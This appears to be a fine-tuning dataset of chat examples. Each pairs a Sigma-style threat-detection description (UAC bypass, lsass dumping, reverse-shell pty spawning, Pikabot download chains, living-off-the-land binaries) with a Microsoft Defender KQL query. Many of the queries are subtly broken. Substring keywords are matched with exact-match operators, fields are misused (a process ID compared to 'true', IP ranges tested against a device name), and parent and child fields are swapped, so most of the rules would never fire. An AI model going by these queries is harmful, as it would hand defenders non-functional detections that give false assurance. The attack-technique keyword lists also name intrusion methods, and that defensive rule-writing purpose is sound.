{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of new files with the \".evtx\" extension in non-common or non-standard location.\nThis could indicate tampering with default EVTX locations in order to evade security controls or simply exfiltration of event log to search for sensitive information within.\nNote that backup software and legitimate administrator might perform similar actions during troubleshooting.\n Topic: file_event_win_create_evtx_non_common_locations"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".evtx\" and (not((FileName in~ (\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Containers\\\\BaseImages\\\\\", \"C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects AdFind execution with common flags seen used during attacks Topic: proc_creation_win_pua_adfind_susp_usage"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"domainlist\", \"trustdmp\", \"dcmodes\", \"adinfo\", \" dclist \", \"computer_pwdnotreqd\", \"objectcategory=\", \"-subnets -f\", \"name=\\\"Domain Admins\\\"\", \"-sc u:\", \"domainncs\", \"dompol\", \" oudmp \", \"subnetdmp\", \"gpodmp\", \"fspdmp\", \"users_noexpire\", \"computers_active\", \"computers_pwdnotreqd\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "load malicious registered COM objects Topic: proc_creation_win_rundll32_registered_com_objects"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"{\", \"}\")) and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the IEExec utility to download and execute files Topic: proc_creation_win_ieexec_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"http://\", \"https://\")) and (FolderPath endswith \"\\\\IEExec.exe\" or ProcessVersionInfoOriginalFileName =~ \"IEExec.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential suspicious applet or osascript executing \"osacompile\". Topic: proc_creation_macos_suspicious_applet_behaviour"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"/applet\", \"/osascript\")) and ProcessCommandLine =~ \"osacompile\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the removal or uninstallation of an application via \"Wmic.EXE\". Topic: proc_creation_win_wmic_uninstall_application"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"call\", \"uninstall\")) and (FolderPath endswith \"\\\\WMIC.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific combinations of encoding methods in PowerShell via the commandline Topic: proc_creation_win_powershell_encoding_patterns"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\"))) and (((ProcessCommandLine in~ (\"ToInt\", \"ToDecimal\", \"ToByte\", \"ToUint\", \"ToSingle\", \"ToSByte\")) and (ProcessCommandLine in~ (\"ToChar\", \"ToString\", \"String\"))) or ((ProcessCommandLine in~ (\"char\", \"join\")) or (ProcessCommandLine in~ (\"split\", \"join\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the \"gcc\" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n Topic: proc_creation_lnx_gcc_shell_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/bin/bash,-s\", \"/bin/dash,-s\", \"/bin/fish,-s\", \"/bin/sh,-s\", \"/bin/zsh,-s\")) and (ProcessCommandLine =~ \"-wrapper\" and (InitiatingProcessFolderPath in~ (\"/c89\", \"/c99\", \"/gcc\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of the default dump file used by Outflank Dumpert tool. A process dumper, which dumps the lsass process memory Topic: file_event_win_hktl_dumpert"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"dumpert.dmp\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the \"IDiagnosticProfileUAC\" UAC bypass technique Topic: proc_creation_win_uac_bypass_idiagnostic_profile"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessCommandLine =~ \" /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}\" and InitiatingProcessFileName =~ \"\\\\DllHost.exe\" and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects email exfiltration via powershell cmdlets Topic: proc_creation_win_powershell_email_exfil"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Add-PSSnapin\", \"Get-Recipient\", \"-ExpandProperty\", \"EmailAddresses\", \"SmtpAddress\", \"-hidetableheaders\")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential LethalHTA technique where the \"mshta.exe\" is spawned by an \"svchost.exe\" process Topic: proc_creation_win_mshta_lethalhta_technique"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\svchost.exe\" and InitiatingProcessFolderPath =~ \"\\\\mshta.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the HypervisorEnforcedCodeIntegrity registry key and the \"Enabled\" value being set to 0 in order to disable the Hypervisor Enforced Code Integrity feature. This allows an attacker to load unsigned and untrusted code to be run in the kernel\n Topic: registry_set_deviceguard_hypervisorenforcedcodeintegrity_disabled"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\DeviceGuard\\\\HypervisorEnforcedCodeIntegrity\" or RegistryKey endswith \"\\\\Control\\\\DeviceGuard\\\\HypervisorEnforcedCodeIntegrity\" or RegistryKey endswith \"\\\\Control\\\\DeviceGuard\\\\Scenarios\\\\HypervisorEnforcedCodeIntegrity\\\\Enabled\") and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential abuse of Windows Subsystem for Linux (WSL) binary as a Living of the Land binary in order to execute arbitrary Linux or Windows commands.\n Topic: proc_creation_win_wsl_arbitrary_command_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" -e \", \" --exec\", \" --system\", \" --shell-type \", \" /mnt/c\", \" --user root\", \" -u root\", \"--debug-shell\")) and (FolderPath endswith \"\\\\wsl.exe\" or ProcessVersionInfoOriginalFileName =~ \"wsl.exe\")) and (not((InitiatingProcessFileName =~ \"\\\\cmd.exe\" and (ProcessCommandLine in~ (\" -d \", \" -e kill \")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious inline VBScript keywords as used by UNC2452 Topic: proc_creation_win_apt_unc2452_vbscript_pattern"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Execute\", \"CreateObject\", \"RegRead\", \"window.close\", \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\")) and (not(ProcessCommandLine =~ \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files Topic: proc_creation_win_lolbin_susp_certreq_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -Post \", \" -config \", \" http\", \" C:\\\\windows\\\\win.ini \")) and (FolderPath endswith \"\\\\certreq.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertReq.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information Topic: proc_creation_win_gpresult_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/z\", \"/v\")) and InitiatingProcessFolderPath =~ \"\\\\gpresult.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of Xwizard tool with the \"RunWizard\" flag and a GUID like argument.\nThis utility can be abused in order to run custom COM object created in the registry.\n Topic: proc_creation_win_xwizard_runwizard_com_object_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"RunWizard\" and ProcessCommandLine matches regex \"\\\\{[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\\\\}\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects image load events of system control panel items (.cpl) from uncommon or non-system locations which might be the result of sideloading. Topic: image_load_side_load_cpl_from_non_system_location"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\hdwwiz.cpl\" or FolderPath endswith \"\\\\appwiz.cpl\") and (not((FolderPath contains \":\\\\Windows\\\\System32\\\\\" or FolderPath contains \":\\\\Windows\\\\SysWOW64\\\\\" or FolderPath contains \":\\\\Windows\\\\WinSxS\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a script interpreter wscript/cscript opening a network connection to a non-local network. Adversaries may use script to download malicious payloads. Topic: net_connection_win_wscript_cscript_outbound_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and (InitiatingProcessFolderPath in~ (\"\\\\wscript.exe\", \"\\\\cscript.exe\"))) and (not(((InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"169.254.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\")) or InitiatingProcessRemoteSessionDeviceName =~ \"20.0.0.0/11\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of commands via the run dialog box on Windows by checking values of the \"RunMRU\" registry key.\nThis technique was seen being abused by threat actors to deceive users into pasting and executing malicious commands, often disguised as CAPTCHA verification steps.\n Topic: registry_set_runmru_command_execution"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\RunMRU\" and (not(RegistryKey endswith \"\\\\MRUList\")) and (not((RegistryValueData contains \"ping\" or (RegistryValueData in~ (\"%appdata%\\\\1\", \"%localappdata%\\\\1\", \"%public%\\\\1\", \"%temp%\\\\1\", \"calc\\\\1\", \"dxdiag\\\\1\", \"explorer\\\\1\", \"gpedit.msc\\\\1\", \"mmc\\\\1\", \"notepad\\\\1\", \"regedit\\\\1\", \"services.msc\\\\1\", \"winver\\\\1\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks.\nThis can be a false positive on server systems but on workstations users should rarely mount .iso or .img files.\n Topic: file_event_win_iso_file_recent"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Microsoft\\\\Windows\\\\Recent\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a hidden user account on macOS (UserID < 500) or with IsHidden option Topic: proc_creation_macos_create_hidden_account"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine =~ \"create\" and InitiatingProcessFolderPath =~ \"/dscl\") and (ProcessCommandLine matches regex \"([0-9]|[1-9][0-9]|[1-4][0-9]{2})\" and ProcessCommandLine =~ \"UniqueID\")) or ((ProcessCommandLine =~ \"create\" and InitiatingProcessFolderPath =~ \"/dscl\") and (ProcessCommandLine =~ \"IsHidden\" and (ProcessCommandLine in~ (\"true\", \"yes\", \"1\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious command line reg.exe tool adding key to RUN key in Registry Topic: proc_creation_win_reg_add_run_key"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"reg\", \" ADD \", \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "This detection uses Windows security events to detect suspicious access attempts to the registry key values and sub-keys of Azure AD Health service agents (e.g AD FS).\nInformation from AD Health service agents can be used to potentially abuse some of the features provided by those services in the cloud (e.g. Federation).\nThis detection requires an access control entry (ACE) on the system access control list (SACL) of the following securable object: HKLM:\\SOFTWARE\\Microsoft\\ADHealthAgent.\nMake sure you set the SACL to propagate to its sub-keys.\n Topic: win_security_aadhealth_svc_agent_regkey_access"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey =~ \"\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\ADHealthAgent\" and (not((InitiatingProcessFolderPath contains \"Microsoft.Identity.Health.Adfs.DiagnosticsAgent.exe\" or InitiatingProcessFolderPath contains \"Microsoft.Identity.Health.Adfs.InsightsService.exe\" or InitiatingProcessFolderPath contains \"Microsoft.Identity.Health.Adfs.MonitoringAgent.Startup.exe\" or InitiatingProcessFolderPath contains \"Microsoft.Identity.Health.Adfs.PshSurrogate.exe\" or InitiatingProcessFolderPath contains \"Microsoft.Identity.Health.Common.Clients.ResourceMonitor.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"Diskshadow.exe\" in script mode using the \"/s\" flag where the script is located in a potentially suspicious location. Topic: proc_creation_win_diskshadow_script_mode_susp_location"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"-s \" or ProcessCommandLine contains \"/s \" or ProcessCommandLine contains \"\u2013s \" or ProcessCommandLine contains \"\u2014s \" or ProcessCommandLine contains \"\u2015s \") and (ProcessVersionInfoOriginalFileName =~ \"diskshadow.exe\" or FolderPath endswith \"\\\\diskshadow.exe\") and (ProcessCommandLine in~ (\":\\\\Temp\\\\\", \":\\\\Windows\\\\Temp\\\\\", \"\\\\AppData\\\\Local\\\\\", \"\\\\AppData\\\\Roaming\\\\\", \"\\\\ProgramData\\\\\", \"\\\\Users\\\\Public\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a python process calling to the PTY module in order to spawn a pretty tty which could be indicative of potential reverse shell activity.\n Topic: proc_creation_lnx_python_pty_spawn"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"import pty\", \"from pty \")) and ProcessCommandLine =~ \"spawn\" and ((FolderPath endswith \"/python\" or FolderPath endswith \"/python2\" or FolderPath endswith \"/python3\") or (FolderPath contains \"/python2.\" or FolderPath contains \"/python3.\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface Topic: proc_creation_win_uac_bypass_icmluautil"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessCommandLine in~ (\"/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\", \"/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}\")) and InitiatingProcessFileName =~ \"\\\\dllhost.exe\") and (not((FolderPath endswith \"\\\\WerFault.exe\" or ProcessVersionInfoOriginalFileName =~ \"WerFault.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of a browser process with a URL argument pointing to a file with a potentially interesting extension. This can be abused to download arbitrary files or to hide from the user for example by launching the browser in a minimized state. Topic: proc_creation_win_browsers_inline_file_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \".7z\" or ProcessCommandLine endswith \".dat\" or ProcessCommandLine endswith \".dll\" or ProcessCommandLine endswith \".exe\" or ProcessCommandLine endswith \".hta\" or ProcessCommandLine endswith \".ps1\" or ProcessCommandLine endswith \".psm1\" or ProcessCommandLine endswith \".txt\" or ProcessCommandLine endswith \".vbe\" or ProcessCommandLine endswith \".vbs\" or ProcessCommandLine endswith \".zip\") and ProcessCommandLine =~ \"http\" and (InitiatingProcessFolderPath in~ (\"\\\\brave.exe\", \"\\\\chrome.exe\", \"\\\\msedge.exe\", \"\\\\opera.exe\", \"\\\\vivaldi.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects process creation events that use the Sysnative folder (common for CobaltStrike spawns) Topic: proc_creation_win_susp_sysnative"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine contains \":\\\\Windows\\\\Sysnative\\\\\" or FolderPath contains \":\\\\Windows\\\\Sysnative\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of concatenated commands via \"cmd.exe\". Pikabot often executes a combination of multiple commands via the command handler \"cmd /c\" in order to download and execute additional payloads.\nCommands such as \"curl\", \"wget\" in order to download extra payloads. \"ping\" and \"timeout\" are abused to introduce delays in the command execution and \"Rundll32\" is also used to execute malicious DLL files.\nIn the observed Pikabot infections, a combination of the commands described above are used to orchestrate the download and execution of malicious DLL files.\n Topic: proc_creation_win_malware_pikabot_combined_commands_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"cmd\", \"/c\")) and (ProcessCommandLine in~ (\" curl\", \" wget\", \" timeout \", \" ping \")) and (ProcessCommandLine in~ (\" rundll32\", \" mkdir \")) and (ProcessCommandLine in~ (\" & \", \" || \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of suspcious binary files inside the \"\\windows\\system32\\spool\\drivers\\color\\\" as seen in the blog referenced below Topic: file_event_win_susp_spool_drivers_color_drop"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".dll\", \".exe\", \".sys\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory Topic: proc_creation_win_citrix_trolleyexpress_procdump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\TrolleyExpress 7\", \"\\\\TrolleyExpress 8\", \"\\\\TrolleyExpress 9\", \"\\\\TrolleyExpress.exe 7\", \"\\\\TrolleyExpress.exe 8\", \"\\\\TrolleyExpress.exe 9\", \"\\\\TrolleyExpress.exe -ma \")) or (InitiatingProcessFolderPath =~ \"\\\\TrolleyExpress.exe\" and (not((isnull(ProcessVersionInfoOriginalFileName) or ProcessVersionInfoOriginalFileName contains \"CtxInstall\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of the \"Accesschk\" utility, an access and privilege audit tool developed by SysInternal and often being abused by attacker to verify process privileges Topic: proc_creation_win_sysinternals_accesschk_check_permissions"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"uwcqv \", \"kwsu \", \"qwsu \", \"uwdqs \")) and (ProcessVersionInfoProductName endswith \"AccessChk\" or ProcessVersionInfoFileDescription contains \"Reports effective permissions\" or (FolderPath endswith \"\\\\accesschk.exe\" or FolderPath endswith \"\\\\accesschk64.exe\") or ProcessVersionInfoOriginalFileName =~ \"accesschk.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the filename DumpStack.log to evade Microsoft Defender Topic: proc_creation_win_susp_dumpstack_log_evasion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\DumpStack.log\" or ProcessCommandLine =~ \" -o DumpStack.log\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of bitsadmin downloading a file to uncommon target folder Topic: proc_creation_win_bitsadmin_download_uncommon_targetfolder"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" /transfer \", \" /create \", \" /addfile \")) and (ProcessCommandLine in~ (\"%AppData%\", \"%temp%\", \"%tmp%\", \"\\\\AppData\\\\Local\\\\\", \"C:\\\\Windows\\\\Temp\\\\\")) and (FolderPath endswith \"\\\\bitsadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"bitsadmin.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious Plink tunnel port forwarding to a local port Topic: proc_creation_win_plink_port_forwarding"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoFileDescription =~ \"Command-line SSH, Telnet, and Rlogin client\" and ProcessCommandLine =~ \" -R \""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed \"cloudflared\" binary. Topic: proc_creation_win_renamed_cloudflared"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"-url\", \"tunnel\")) or (ProcessCommandLine in~ (\"-config \", \"-connector-id \")) or (SHA256 startswith \"2fb6c04c4f95fb8d158af94c137f90ac820716deaf88d8ebec956254e046cb29\" or SHA256 startswith \"b3d21940a10fdef5e415ad70331ce257c24fe3bcf7722262302e0421791f87e8\" or SHA256 startswith \"1fbd8362b2d2d2e6a5750ae3db69cd1815e6c1d31da48a98b796450971a8e039\" or SHA256 startswith \"0409c9b12f9d0eda86e461ed9bdabeefb00172b26322079681a0bdf48e68dc28\" or SHA256 startswith \"7cfb411d04bac42ef93d1f0c93c0a481e38c6f4612b97ae89d4702595988edc7\" or SHA256 startswith \"5b3c2d846ab162dc6bc595cce3a49de5731afde5d6060be7066d21b013a28373\" or SHA256 startswith \"ce95df7f69664c3df19b76028e115931919a71517b776da7b42d353e2ff4a670\" or SHA256 startswith \"1293525a19cfe3bc8296b62fbfe19f083632ed644a1c18c10b045a1d3030d81a\" or SHA256 startswith \"af2b9161cfcb654b16408cd6b098afe9d1fb61a037d18d7090a119d4c0c8e0f0\" or SHA256 startswith \"39ddceb56a15798826a5fc4892fa2b474c444bb4d7a8bf2fa95e41cab10fa7a1\" or SHA256 startswith \"ccd11f2328023a0e7929e845d5b6e7bc783fb4650d65faef3ae090239d4bbce2\" or SHA256 startswith \"b6e5c5d2567ae8c69cc012ebcae30e6c9b5359d64a58d17ba75ec89f8bce71ac\" or SHA256 startswith \"f813484ea441404f18caad96f28138e8aaf0cb256163c09c2ab8a3acab87f69f\" or SHA256 startswith \"fc4a0802ab9c7409b892ca00636bec61e2acfc911bccfdeb9978b8ab5a2f828d\" or SHA256 startswith \"083150724b49604c8765c1ba19541fa260b133be0acb0647fcd936d81f054499\" or SHA256 startswith \"44303d6572956f28a0f2e4b188934fb9874f2584f5c81fa431a463cfbf28083b\" or SHA256 startswith \"5d38c46032a58e28ae5f7d174d8761ec3d64d186677f3ec53af5f51afb9bfd2f\" or SHA256 startswith \"e1e70fa42059911bc6685fafef957f9a73fc66f214d0704a9b932683a5204032\" or SHA256 startswith \"c01356092a365b84f84f0e66870bd1a05ba3feb53cafd973fa5fea2534bee234\" or SHA256 startswith \"b3f9c06151e30ee43d39e788a79cd918a314f24e04fe87f3de8272a2057b624f\" or SHA256 startswith \"cd81b2792f0739f473c31c9cb7cf2313154bfa28b839975802b90e8790bb5058\" or SHA256 startswith \"9ec7e6c8e1bfd883663d8d9d62c9e4f9ae373b731407181e32491b27a7218a2c\" or SHA256 startswith \"c2cfd23fdc6c0e1b1ffa0e545cbe556f18d11b362b4a89ba0713f6ab01c4827f\" or SHA256 startswith \"53f8adbd76c0eb16f5e43cadde422474d8a06f9c8f959389c1930042ad8beaa5\" or SHA256 startswith \"648c8d2f8001c113d2986dd00b7bbd181593d462bef73522cee212c4f71f95b3\" or SHA256 startswith \"ae047e2095e46c3f9c518b2be67ec753f4f0aad23b261a361fcb6144dcdb63b4\" or SHA256 startswith \"3153d2baa462978dd22ab33d1c2274ecc88c200225d6a3327f98d5b752d08f5c\" or SHA256 startswith \"f49cde976e628012c9db73e1c8d76081944ecf2297cdafeb78bb13290da274c4\" or SHA256 startswith \"d2513e58bb03ccc83affde685c6ef987924c37ce6707d8e9857e2524b0d7e90f\" or SHA256 startswith \"bb67c7623ba92fe64ffd9816b8d5b3b1ea3013960a30bd4cf6e295b3eb5b1bad\" or SHA256 startswith \"b34b3c3a91e3165d1481f0b3ec23eab93a1cfba94345a6cbfe5b18ddbd48eac7\" or SHA256 startswith \"f7848034e010d55f15e474ca998f96391e320ff29b00cfcc4c5e536529703e75\" or SHA256 startswith \"b6fc9493778cbe3bfc062d73f5cc604bc0ff058bc5e5dc6aac87f3a4008b54b6\" or SHA256 startswith \"f5c5e962577e2293c4ad10603816dce7cc273585969615fbf4e4bfa9eaff1688\" or SHA256 startswith \"d14c52d9220b606f428a8fe9f7c108b0d6f14cf71e7384749e98e6a95962e68f\" or SHA256 startswith \"d3a0e1a79158f3985cd49607ebe0cdfcc49cb9af96b8f43aefd0cdfe2f22e663\" or SHA256 startswith \"2fbbfc8299537ff80cadf9d0e27c223fe0ccb9052bf9d8763ad717bbfa521c77\" or SHA256 startswith \"19074674c6fbdaa573b3081745e5e26144fdf7a086d14e0e220d1814f1f13078\") or (ProcessCommandLine in~ (\"-config \", \"-credentials-contents \", \"-credentials-file \", \"-token \"))) and (not((InitiatingProcessFolderPath in~ (\"\\\\cloudflared.exe\", \"\\\\cloudflared-windows-386.exe\", \"\\\\cloudflared-windows-amd64.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports Topic: proc_creation_win_apt_unc2452_ps"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Invoke-WMIMethod win32_process -name create -argumentlist\", \"rundll32 c:\\\\windows\")) or (ProcessCommandLine in~ (\"wmic /node:\", \"process call create \\\"rundll32 c:\\\\windows\"))"}]}
